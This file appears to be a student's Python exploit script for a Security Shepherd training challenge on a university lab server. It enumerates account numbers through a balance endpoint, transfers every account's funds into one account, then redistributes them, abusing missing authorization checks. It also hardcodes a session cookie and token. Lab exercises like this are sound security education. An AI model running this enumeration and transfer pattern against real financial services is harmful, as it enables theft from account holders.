import requests

ACC_LIMIT = 2000
MAIN_ACC_ID = 1453

url = "https://shepherd.hs25.isf.hslu-edu.ch/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00cCurrentBalance"
url_transfer = "https://shepherd.hs25.isf.hslu-edu.ch/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00cTransfer"

payload = 'accountNumber='
payload = 'accountNumber='
headers = {
  'User-Agent': 'YEEEEEHAAAW',
  'Accept': '*/*',
  'Accept-Language': 'en-US,en;q=0.5',
  'Accept-Encoding': 'gzip, deflate, br, zstd',
  'Content-Type': 'application/x-www-form-urlencoded',
  'X-Requested-With': 'XMLHttpRequest',
  'Origin': 'https://shepherd.hs25.isf.hslu-edu.ch',
  'Connection': 'keep-alive',
  'Referer': 'https://shepherd.hs25.isf.hslu-edu.ch/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00c.jsp',
  'Cookie': 'JSESSIONID=4F897512BBCF7741E3AF84B64BB17B7E; token=102288616228792200974997167174690941873',
  'Sec-Fetch-Dest': 'empty',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Site': 'same-origin',
  'TE': 'trailers'
}

def get_bal(id):
  response = requests.request("POST", url, headers=headers, data=payload+str(id))
  if "An Error Occurred!" not in response.text and "<" not in response.text:
    return int(float(response.text))
  return -1

def transfer(f, t, a): 
  payload = f'senderAccountNumber={f}&recieverAccountNumber={t}&transferAmount={a -1}'
  response = requests.request("POST", url_transfer, headers=headers, data=payload)
  return response


valid_accs = dict()

# get all accs
print("------- GETTING ACCOUNT BALANCES -------")
for i in range(0, ACC_LIMIT):
  val = get_bal(i)
  if val < 0:
    print(f"{i}: invalid balance")
    continue

  print(f'{i}: {val}')
  valid_accs.update({i: val})

# put all in one acc
print("------- PUTTING ALL ON BLACK -------")
for k,v in valid_accs.items():
  res = transfer(k, MAIN_ACC_ID, v)
  print(f"{k}: {res.text}")

total = get_bal(MAIN_ACC_ID)
share = total / (len(valid_accs) -1)

print("------- DISTRIBUTING -------")
for k,v in valid_accs.items():
  if k == MAIN_ACC_ID:
    continue
  res = transfer(MAIN_ACC_ID, k, share)
  print(f"{k}: {res.text}")